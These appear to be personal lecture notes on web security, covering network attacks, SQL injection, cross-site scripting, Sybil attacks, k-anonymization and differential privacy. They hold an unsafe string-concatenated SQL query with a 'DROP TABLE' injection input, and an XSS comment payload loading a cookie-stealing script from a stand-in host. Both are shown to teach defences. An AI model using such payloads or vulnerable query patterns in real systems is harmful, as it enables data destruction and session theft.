[[2023-05-11]] #Webpage #WebSecurity 

### Network Attacks
Network attacks happen as information travels between client and server. There are briefly three kinds of attacks we are going to cover.
- **Eavesdropping**
- **Man-in-the-middle** (MITM)
	- E.g. provision of fake Amazon public key
		- Solution: HTTPS with **[[5 Encryption#^e0821c|certificate authorities]]**
- **Replay**
	- Memorize a message and send it multiple times
	- E.g. memorize bill-paying message to fake the process
		- Solution: make every message **different**: (1) incrementing number, (2) random number (only once)

---

### Web Attack
While network attacks pertain to information in transit, web attacks are related to the design of our `flask` App. We will again discuss three main types of web attacks.

#### SQL Injection
The following could happen if we backend code like this
```python
username = flask.request.form["username"]

query =  
	"SELECT hash "  
	"FROM passwords "  
	"WHERE user = '" + username + "'"
```

If a client deliberately passed in a string: `; DROP TABLE PASSWORDS --`, the SQL query will drop the entire database we have back there!

Instead, it's a good habit to **separate code from data**:
```python
db.execute( "SELECT hash " 
		   "FROM passwords " 
		   "WHERE user = ?", (username,))
```

#### Cross-Site Scripting
If you allow users to post comments or other **text**, they can put **HTML tags**.
- `<script>` tag loads **code** that will run in other users' browsers

For instance,
```html
Nice picture! <script src="http://evil.com/steal_cookies.js" />
```

#### Sybil
One (1) real-life user pretends to be **multiple** online users.
- Get around bans
- Vote more than once
- Fake reviews

To protect against this, we could
- Require real phone numbers
- CAPTCHAS

---

### Database Anonymity
Data are sometimes a liability rather than an asset. There are three main methods to prevent data leakage.
- Store only the data you need
- K-anonymization
- Differential privacy

#### K-Anonymization
The power of “hiding in the crowd.” Specifically, a dataset is **k-anonymous** if quasi-identifiers for each person in the dataset are **identical** to at least $k – 1$ other people also in the dataset.

```ad-example
If we have a dataset of students' graduation year, major, and GPA, what we could do to make it 2-anoynomous is to change the graduation year (identifier) to a range of years so that there are always **AT LEAST two** rows that potentially match.
```

The downside of using k-anonymization are
- **Losing information** when you transform data
- **NP-hard** to find optimal k-anonymization
	- Optimal being losing the **LEAST** information
- If everyone in a group has the **same sensitive information**, k-anonymity doesn't help

#### Differential Privacy
Add **noise** to answers.
- Repeated queries still a problem – if I can ask 1000 times, I will **converge** to the mean and effectively remove the added noise.